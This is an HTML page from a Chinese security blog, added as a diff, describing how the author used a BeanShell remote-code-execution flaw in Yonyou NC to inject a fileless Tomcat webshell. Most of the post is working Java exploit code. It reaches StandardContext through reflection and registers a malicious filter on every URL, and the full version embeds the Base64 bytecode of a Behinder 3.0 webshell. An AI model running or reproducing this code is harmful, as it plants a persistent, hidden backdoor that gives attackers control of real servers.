@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <title>BeanShell注入内存马-fuzz7j's Blog</title>
+  <meta charset="utf-8" />
+  <meta http-equiv="content-language" content="zh-CN" />
+  <meta name="theme-color" content="#ffffff" />
+  <meta name="supported-color-schemes" content="light dark">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="applicable-device" content="pc,mobile">
+  <meta name="author" content="" />
+  <meta name="description" content="BeanShell注入内存马"/>
+  <meta name="keywords" content=",Java"/>
+  <link rel="icon" href="/static/img/favicon.ico" />
+  <link rel="apple-touch-icon" href="/static/img/logo.png" />
+  <link rel="stylesheet" href="/static/css/common.css?t=20230716172519">
+  <link rel="stylesheet" href="/static/css/theme-dark.css?t=20230716172519">
+  <link rel="stylesheet" href="/static/css/post.css?t=20230716172519">
+  <link rel="stylesheet" href="/static/css/code-dark.css?t=20230716172519">
+  <link rel="stylesheet" href="/static/css/code-light.css?t=20230716172519">
+  <link rel="prefetch" href="/static/xml/search.xml?t=20230716172519">
+  <link rel="prefetch" href="/static/js/search.js?t=20230716172519">
+  <script>
+    window.blog = {
+      baseurl:"",
+      buildAt:"20230716172519",
+      darkTheme: false,
+      setDarkTheme: function (dark) {
+        this.darkTheme = Boolean(dark);
+        document.documentElement.className = this.darkTheme ? 'dark': '';
+        document.querySelector('meta[name=theme-color]').setAttribute('content', this.darkTheme ? '#2D2E32': '#FFFFFF');
+      }
+    }
+    if (sessionStorage.darkTheme !== undefined) {
+      blog.setDarkTheme(sessionStorage.darkTheme === 'true'); // 记忆值，单个窗口内有效
+    } else {
+      blog.setDarkTheme(window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches); // 跟随系统
+    }
+    if (window.matchMedia) {
+      var media = window.matchMedia('(prefers-color-scheme: dark)');
+      media.addListener(function (ev) {
+        blog.setDarkTheme(ev.currentTarget.matches);
+        sessionStorage.removeItem('darkTheme');
+      });
+    }
+  </script>
+</head>
+<body ondragstart="return false;">
+<header class="header">
+  <img class="logo" src="/static/img/logo.jpg" alt="logo"/>
+  <nav class="menu">
+    <a href="/" class="hover-underline">首页</a>
+    <a href="/pages/categories" class="hover-underline">归档</a>
+    <a href="/pages/search" class="hover-underline">搜索</a>
+    <a href="/pages/links" class="hover-underline">友链</a>
+    <a href="/pages/about" class="hover-underline">关于</a>
+    </nav>
+</header>
+<div class="page page-post">
+  <h1 class="title" id="BeanShell注入内存马">BeanShell注入内存马</h1>
+  
+  <div class="subtitle"> 于 2023-04-03 发布</div>
+  
+  <div class="post">
+    <h2 id="背景">背景</h2>
+
+<p>项目遇到用友NC只存在BeanShell远程代码执行漏洞，写入jsp访问404，尝试通过BeanShell注入内存马，本篇文章主要记录过程中遇到的一些问题。</p>
+
+<h2 id="request对象">request对象</h2>
+<p>通过java-object-searcher获取request对象后，发现Tomcat6无法通过request对象获取StandardContext，仅能获取Header。</p>
+
+<pre><code class="language-Java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.tomcat.util.buf.ByteChunk;
+import java.lang.reflect.Field;
+import java.util.ArrayList;
+
+try {
+    Object obj = Thread.currentThread();
+    Field field = obj.getClass().getSuperclass().getDeclaredField("group");
+    field.setAccessible(true);
+    obj = field.get(obj);
+
+    field = obj.getClass().getDeclaredField("threads");
+    field.setAccessible(true);
+    obj = field.get(obj);
+
+    Thread[] threads = (Thread[]) obj;
+    for (Thread thread : threads) {
+        if (thread.getName().contains("http") &amp;&amp; thread.getName().contains("Acceptor")) {
+            try {
+                field = thread.getClass().getDeclaredField("target");
+                field.setAccessible(true);
+                obj = field.get(thread);
+
+
+                field = obj.getClass().getDeclaredField("this$0");
+                field.setAccessible(true);
+                obj = field.get(obj);
+
+                field = obj.getClass().getDeclaredField("handler");
+                field.setAccessible(true);
+                obj = field.get(obj);
+
+                field = obj.getClass().getSuperclass().getDeclaredField("global");
+                field.setAccessible(true);
+                obj = field.get(obj);
+
+                field = obj.getClass().getDeclaredField("processors");
+                field.setAccessible(true);
+                obj = field.get(obj);
+
+                java.util.ArrayList processors = (java.util.ArrayList) obj;
+                for (Object o : processors) {
+                    try {
+                        field = o.getClass().getDeclaredField("req");
+                        field.setAccessible(true);
+                        obj = field.get(o);
+                    
+                        org.apache.coyote.Request request = (org.apache.coyote.Request) obj;
+                    
+                        org.apache.coyote.Response resp = request.getResponse();
+                        
+                    }catch (Exception e){
+                        e.printStackTrace();
+                    }
+                }
+                    } catch (Exception e) {
+                e.printStackTrace();
+                    }
+        }
+    }
+
+}catch (Exception e){
+    e.printStackTrace();
+}
+</code></pre>
+
+<h2 id="standardcontext">StandardContext</h2>
+
+<p>查阅发现bitterz师傅的文章提供了Tomcat全版本获取StandardContext的思路。</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat678 currentThread -&gt; threadGroup -&gt; for(threads) -&gt;target
+    -&gt;this$0-&gt;handler-&gt;proto-&gt;adapter-&gt;connector-&gt;service-&gt;container
+        -&gt;children(一个HashMap，get获取standardHost)-&gt;standardHost-&gt;children(一个HashMap，get获取standardContext)
+</code></pre></div></div>
+
+<p>测试发现文中代码从HashMap中获取standardHost时，key键为localhost，通过serverName获取会导致远程访问时出现空指针，bitterz师傅也曾在评论区留言提供解决思路。</p>
+
+<p>通过以下修改将通过serverName获取修改为遍历StandardHost。</p>
+
+<pre><code class="language-Java">Iterator iterator2 = children.keySet().iterator();
+while (iterator2.hasNext()) {
+    StandardHost standardHost = (StandardHost) children.get(iterator2.next());
+
+    field = standardHost.getClass().getSuperclass().getDeclaredField("children");
+    field.setAccessible(true);
+    children = (HashMap) field.get(standardHost);
+                                    
+    Iterator iterator3 = children.keySet().iterator();
+
+    while (iterator3.hasNext()){
+        String contextKey = (String) iterator3.next();
+        if (!(uri.startsWith(contextKey))){continue;}
+        StandardContext standardContext = (StandardContext) children.get(contextKey);
+
+    }
+}
+</code></pre>
+
+<p>获取StandardContext后尝试注入Filter，在通过defineClass加载字节码时，发现由于用友NC自带jdk为1.7.0_51，没有java.util.Base64类，需要使用sun.misc.BASE64Decoder进行Base64解码。</p>
+
+<pre><code class="language-Java">ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();
+String clzBytecodeBase64Str = "";
+byte[] bytecode = null;
+try {
+    Class base64 = clzLoader.loadClass("sun.misc.BASE64Decoder");
+    Object decoder = base64.newInstance();
+    bytecode = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, clzBytecodeBase64Str);
+} catch (Exception e) {
+
+}
+</code></pre>
+
+<p>此时发现代码不能执行，一直抛出异常。调试发现BeanShell对于反射通过bsh.Reflect进行处理，可变参数必须按照参数类型传参，修改为如下代码。</p>
+
+<pre><code class="language-Java">ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();
+String clzBytecodeBase64Str = "";
+byte[] bytecode = null;
+try {
+    Class base64 = clzLoader.loadClass("sun.misc.BASE64Decoder");
+    Object decoder = base64.newInstance();
+    bytecode = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{clzBytecodeBase64Str});
+} catch (Exception e) {
+
+}
+</code></pre>
+
+<h2 id="注入filter">注入filter</h2>
+
+<p>注入filter流程：
+通过defineClass加载恶意filter类后，使用filterDef封装filter对象，调用StandardContext的addFilterDef存到FilterDefs，创建filterMap对象后调用StandardContext的addFilterMap存到FilterMaps，使用ApplicationFilterConfig封装filterDef存到filterConfigs。</p>
+
+<pre><code class="language-Java">java.lang.reflect.Method defineClzMethod = clzLoader.loadClass("java.lang.ClassLoader").getDeclaredMethod("defineClass", new Class[]{String.class, byte[].class, int.class, int.class});
+defineClzMethod.setAccessible(true);
+
+Class filterClass = (Class) defineClzMethod.invoke((Object) clzLoader, new Object[]{null, bytecode, 0, bytecode.length});
+Object filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").getConstructor(new Class[]{}).newInstance(new Object[]{});
+java.lang.reflect.Method setFilterName = filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class});
+setFilterName.invoke(filterDef, new Object[]{"TestFilter"});
+java.lang.reflect.Method setFilterClass = filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class});
+setFilterClass.invoke(filterDef, new Object[]{filterClass.getName()});
+java.lang.reflect.Method addFilterDef = standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{org.apache.catalina.deploy.FilterDef.class});
+addFilterDef.invoke(standardContext, new Object[]{filterDef});
+
+
+Object filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").getConstructor(new Class[]{}).newInstance(new Object[]{});
+java.lang.reflect.Method setFilterName2 = filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class});
+setFilterName2.invoke(filterMap, new Object[]{"TestFilter"});
+java.lang.reflect.Method setDispatcher = filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class});
+java.lang.reflect.Method addURLPattern = filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class});
+setDispatcher.invoke(filterMap, new Object[]{"REQUEST"});
+addURLPattern.invoke(filterMap, new Object[]{"/*"});
+java.lang.reflect.Method addFilterMap = standardContext.getClass().getDeclaredMethod("addFilterMap", new Class[]{org.apache.catalina.deploy.FilterMap.class});
+addFilterMap.invoke(standardContext, new Object[]{filterMap});
+
+
+java.lang.reflect.Constructor filterConfigConstructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructor(new Class[]{Class.forName("org.apache.catalina.Context"), Class.forName("org.apache.catalina.deploy.FilterDef")});
+filterConfigConstructor.setAccessible(true);
+Object filterConfig = filterConfigConstructor.newInstance(new Object[]{standardContext, filterDef});
+Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
+filterConfigsField.setAccessible(true);
+HashMap filterConfigsMap = (HashMap) filterConfigsField.get(standardContext);
+filterConfigsMap.put("TestFilter", filterConfig);
+</code></pre>
+
+<p><img src="/articles/BeanShell/success.png" alt="image" /></p>
+
+<h2 id="完整代码">完整代码</h2>
+
+<p>冰蝎3.0 rebeyond</p>
+
+<pre><code class="language-Java">import org.apache.catalina.core.StandardContext;
+import org.apache.catalina.core.StandardEngine;
+import org.apache.catalina.core.StandardHost;
+
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Iterator;
+
+try {
+    Object object;
+    String serverName;
+    Object obj = Thread.currentThread();
+    Field field = obj.getClass().getSuperclass().getDeclaredField("group");
+    field.setAccessible(true);
+    obj = field.get(obj);
+
+    field = obj.getClass().getDeclaredField("threads");
+    field.setAccessible(true);
+    obj = field.get(obj);
+
+    Thread[] threads = (Thread[]) obj;
+    for (Thread thread : threads) {
+        if (thread.getName().contains("exec") || thread == null) {
+            continue;
+        }
+
+        try {
+            field = thread.getClass().getDeclaredField("target");
+            field.setAccessible(true);
+            Object target = field.get(thread);
+
+            if (!(target instanceof Runnable)) {
+                continue;
+            }
+
+            try {
+                field = target.getClass().getDeclaredField("this$0");
+                field.setAccessible(true);
+                Object point = field.get(target);
+
+                field = point.getClass().getDeclaredField("handler");
+                field.setAccessible(true);
+                Object handler = field.get(point);
+
+                field = handler.getClass().getSuperclass().getDeclaredField("global");
+                field.setAccessible(true);
+                object = field.get(handler);
+            } catch (Exception e) {
+                continue;
+            }
+
+            if (object == null) {
+                continue;
+            }
+
+            field = object.getClass().getDeclaredField("processors");
+            field.setAccessible(true);
+            Object obj2 = field.get(object);
+            java.util.ArrayList processors = (java.util.ArrayList) obj2;
+            Iterator iterator = processors.iterator();
+
+            while (iterator.hasNext()) {
+                Object next = iterator.next();
+                field = next.getClass().getDeclaredField("req");
+                field.setAccessible(true);
+                Object req = field.get(next);
+
+                field = req.getClass().getDeclaredField("serverPort");
+                field.setAccessible(true);
+                Object serverPort = field.get(req);
+
+                if (serverPort.equals(-1)) {
+                    continue;
+                }
+
+                field = req.getClass().getDeclaredField("serverNameMB");
+                field.setAccessible(true);
+                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) field.get(req);
+
+
+                field = serverNameMB.getClass().getDeclaredField("strValue");
+                field.setAccessible(true);
+
+                serverName = (String) field.get(serverNameMB);
+                if (serverName == null) {
+                    serverName = serverNameMB.toString();
+                }
+                if (serverName == null) {
+                    serverName = serverNameMB.getString();
+                }
+
+                field = req.getClass().getDeclaredField("decodedUriMB");
+                field.setAccessible(true);
+                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) field.get(req);
+
+                field = uriMB.getClass().getDeclaredField("strValue");
+                field.setAccessible(true);
+                String uri = (String) field.get(uriMB);
+                if (uri == null) {
+                    uri = uriMB.toString();
+                }
+                if (uri == null) {
+                    uri = uriMB.getString();
+                }
+
+
+                Thread[] threads2 = (Thread[]) obj;
+                for (Thread thread2 : threads2) {
+                    if (thread2.getName().contains("http") &amp;&amp; thread2.getName().contains("Acceptor")) {
+                        try {
+                            field = thread2.getClass().getDeclaredField("target");
+                            field.setAccessible(true);
+                            obj = field.get(thread2);
+
+                                try {
+                                    field = obj.getClass().getDeclaredField("this$0");
+                                    field.setAccessible(true);
+                                    Object point = field.get(obj);
+                                    if (point == null) {
+                                        try {
+                                            field = obj.getClass().getDeclaredField("endpoint");
+                                            field.setAccessible(true);
+                                            obj = field.get(obj);
+                                            point = obj;
+                                        } catch (Exception e) {
+
+                                        }
+                                    }
+
+                                    field = point.getClass().getDeclaredField("handler");
+                                    field.setAccessible(true);
+                                    Object handler = field.get(point);
+
+                                    field = handler.getClass().getDeclaredField("proto");
+                                    field.setAccessible(true);
+                                    Object proto = field.get(handler);
+
+
+                                    Field f = proto.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField("adapter");
+                                    f.setAccessible(true);
+                                    Object adapter = f.get(proto);
+
+                                    field = adapter.getClass().getDeclaredField("connector");
+                                    field.setAccessible(true);
+                                    Object connector = field.get(adapter);
+
+                                    field = connector.getClass().getDeclaredField("service");
+                                    field.setAccessible(true);
+                                    Object service = field.get(connector);
+
+                                    StandardEngine engine = null;
+                                    try {
+                                        field = service.getClass().getDeclaredField("container");
+                                        field.setAccessible(true);
+                                        engine = (StandardEngine) field.get(service);
+                                    } catch (Exception e) {
+                                    }
+
+                                    if (engine == null) {
+                                        field = service.getClass().getDeclaredField("engine");
+                                        field.setAccessible(true);
+                                        engine = (StandardEngine) field.get(service);
+                                    }
+
+                                    field = engine.getClass().getSuperclass().getDeclaredField("children");
+                                    field.setAccessible(true);
+                                    HashMap children = (HashMap) field.get(engine);
+
+                                    Iterator iterator2 = children.keySet().iterator();
+                                    while (iterator2.hasNext()) {
+                                        StandardHost standardHost = (StandardHost) children.get(iterator2.next());
+
+                                        field = standardHost.getClass().getSuperclass().getDeclaredField("children");
+                                        field.setAccessible(true);
+                                        children = (HashMap) field.get(standardHost);
+
+                                        Iterator iterator3 = children.keySet().iterator();
+
+                                        while (iterator3.hasNext()) {
+                                            String contextKey = (String) iterator3.next();
+                                            if (!(uri.startsWith(contextKey))) {
+                                                continue;
+                                            }
+                                            StandardContext standardContext = (StandardContext) children.get(contextKey);
+                                            standardContext = standardContext;
+
+                                            ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();
+                                            String clzBytecodeBase64Str = "yv66vgAAADMAugoAJABYCABZCQArAFoHAFsKAAQAWAcAXAsABgBdCABeCgAEAF8IAGAIADsIAGELAGIAYwgAZAoAZQBmBwBnCgBoAGkKABAAagoAZQBrCABsCgAXAG0IAG4HAG8HAEIJAHAAcQoAFwByCgBzAHQHAHUKABwAWAsAdgB3CgB4AHkKABwAegoAZQB7CgAkAHwKABcAfQcAfgoAcAB/CgBzAIAKABcAgQoAJACCBwCDCwCEAIUHAIYHAIcBAAFrAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA1MVGVzdEZpbHRlcjI7AQAHZGVzdHJveQEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEAC3BhZ2VDb250ZXh0AQATTGphdmEvdXRpbC9IYXNoTWFwOwEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAZtZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADmV2aWxjbGFzc19ieXRlAQACW0IBAAlldmlsY2xhc3MBABFMamF2YS9sYW5nL0NsYXNzOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAANyZXEBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAARyZXNwAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEABWNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQANU3RhY2tNYXBUYWJsZQcAgwEACkV4Y2VwdGlvbnMHAIgHAIkBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEABmNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApTb3VyY2VGaWxlAQAQVGVzdEZpbHRlcjIuamF2YQwALwAwAQAQZTQ1ZTMyOWZlYjVkOTI1YgwALQAuAQARamF2YS91dGlsL0hhc2hNYXABACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DACKAIsBAAdyZXF1ZXN0DACMAI0BAAhyZXNwb25zZQEAAXUHAI4MAI8AkAEAA0FFUwcAkQwAkgCTAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwcAlAwAlQCWDAAvAJcMAFIAmAEAFWphdmEubGFuZy5DbGFzc0xvYWRlcgwAmQCaAQALZGVmaW5lQ2xhc3MBAA9qYXZhL2xhbmcvQ2xhc3MHAJsMAJwARAwAnQCeBwCfDACgAKEBABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyBwCiDACjAKQHAKUMAKYApwwAqACpDACqAKsMAKwArQwArgCvAQAQamF2YS9sYW5nL09iamVjdAwAsACxDACyALMMALQAtQwAtgC3AQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAuAwANwC5AQALVGVzdEZpbHRlcjIBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAIcHV0VmFsdWUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAEGphdmEvbGFuZy9TdHJpbmcBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAAlnZXRSZWFkZXIBABooKUxqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBAAhyZWFkTGluZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhACsAJAABACwAAQAAAC0ALgAAAAQAAQAvADAAAQAxAAAAPQACAAEAAAALKrcAASoSArUAA7EAAAACADIAAAAOAAMAAAANAAQACwAKAA8AMwAAAAwAAQAAAAsANAA1AAAAAQA2ADAAAQAxAAAAKwAAAAEAAAABsQAAAAIAMgAAAAYAAQAAABIAMwAAAAwAAQAAAAEANAA1AAAAAQA3ADgAAgAxAAAB0gAGAAsAAADfuwAEWbcABToEK8AABrkABwEAOgUZBBIIK7YACVcZBBIKLLYACVcZBBILGQW2AAlXEgI6BhkFEgwZBrkADQMAEg64AA86BxkHBbsAEFkZBrYAERIOtwAStgATEhS4ABUSFga9ABdZAxMAGFNZBLIAGVNZBbIAGVO2ABo6CBkIBLYAGxkHuwAcWbcAHSu5AB4BALYAH7YAILYAIToJGQgqtgAitgAjBr0AJFkDGQlTWQQDuAAlU1kFGQm+uAAlU7YAJsAAFzoKGQq2ACcZBLYAKFenAAU6BC0rLLkAKgMAsQABAAAA0QDUACkAAwAyAAAASgASAAAAFwAJABgAFAAaAB0AGwAmABwAMAAdADQAHgA/AB8ARgAgAFoAIQB8ACIAggAjAJwAJADGACUA0QAoANQAJwDWACkA3gAqADMAAAB6AAwACQDIADkAOgAEABQAvQA7ADwABQA0AJ0ALQAuAAYARgCLAD0APgAHAHwAVQA/AEAACACcADUAQQBCAAkAxgALAEMARAAKANYAAABFAEYABAAAAN8ANAA1AAAAAADfAEcASAABAAAA3wBJAEoAAgAAAN8ASwBMAAMATQAAAAkAAvcA1AcATgEATwAAAAYAAgBQAFEAAQBSAFMAAgAxAAAANQAAAAIAAAABsQAAAAIAMgAAAAYAAQAAAC4AMwAAABYAAgAAAAEANAA1AAAAAAABAFQAVQABAE8AAAAEAAEAUAABAFYAAAACAFc=";
+                                            byte[] bytecode = null;
+                                            try {
+                                                Class base64Clz = clzLoader.loadClass("sun.misc.BASE64Decoder");
+                                                Object decoder = base64Clz.newInstance();
+                                                bytecode = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{clzBytecodeBase64Str});
+                                                String result = new String(bytecode);
+                                            } catch (Exception e) {
+
+                                            }
+
+                                            java.lang.reflect.Method defineClzMethod = clzLoader.loadClass("java.lang.ClassLoader").getDeclaredMethod("defineClass", new Class[]{String.class, byte[].class, int.class, int.class});
+                                            defineClzMethod.setAccessible(true);
+
+                                            Class filterClass = (Class) defineClzMethod.invoke((Object) clzLoader, new Object[]{null, bytecode, 0, bytecode.length});
+                                            Object filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").getConstructor(new Class[]{}).newInstance(new Object[]{});
+                                            java.lang.reflect.Method setFilterName = filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class});
+                                            setFilterName.invoke(filterDef, new Object[]{"TestFilter"});
+                                            java.lang.reflect.Method setFilterClass = filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class});
+                                            setFilterClass.invoke(filterDef, new Object[]{filterClass.getName()});
+                                            java.lang.reflect.Method addFilterDef = standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{org.apache.catalina.deploy.FilterDef.class});
+                                            addFilterDef.invoke(standardContext, new Object[]{filterDef});
+
+
+                                            Object filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").getConstructor(new Class[]{}).newInstance(new Object[]{});
+                                            java.lang.reflect.Method setFilterName2 = filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class});
+                                            setFilterName2.invoke(filterMap, new Object[]{"TestFilter"});
+                                            java.lang.reflect.Method setDispatcher = filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class});
+                                            java.lang.reflect.Method addURLPattern = filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class});
+                                            setDispatcher.invoke(filterMap, new Object[]{"REQUEST"});
+                                            addURLPattern.invoke(filterMap, new Object[]{"/*"});
+                                            java.lang.reflect.Method addFilterMap = standardContext.getClass().getDeclaredMethod("addFilterMap", new Class[]{org.apache.catalina.deploy.FilterMap.class});
+                                            addFilterMap.invoke(standardContext, new Object[]{filterMap});
+
+                                            java.lang.reflect.Constructor filterConfigConstructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructor(new Class[]{Class.forName("org.apache.catalina.Context"), Class.forName("org.apache.catalina.deploy.FilterDef")});
+                                            filterConfigConstructor.setAccessible(true);
+                                            Object filterConfig = filterConfigConstructor.newInstance(new Object[]{standardContext, filterDef});
+                                            Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
+                                            filterConfigsField.setAccessible(true);
+                                            HashMap filterConfigsMap = (HashMap) filterConfigsField.get(standardContext);
+                                            filterConfigsMap.put("TestFilter", filterConfig);
+                                        }
+                                    }
+                            } catch (Exception e) {}
+                        } catch (Exception e) {}
+                    }
+                }
+            }
+        } catch (Exception e) {continue;}
+    }
+} catch (Exception e) {}
+</code></pre>
+
+<p>```</p>
+
+<h2 id="参考链接">参考链接</h2>
+
+<p>https://xz.aliyun.com/t/9914
+https://github.com/c0ny1/java-object-searcher</p>
+
+  </div>
+  
+</div>
+<footer class="footer">
+  <span></span>
+  <span text-align: center>Copyright © 2021 fuzz7j</span>
+</footer>
+<div id="to-top">
+  <span></span>
+  <span></span>
+</div><script type="text/javascript" src="/static/js/blog.js?t=20230716172519"></script>
+<script type="text/javascript" src="/static/js/search.js?t=20230716172519"></script></body>
+</html>
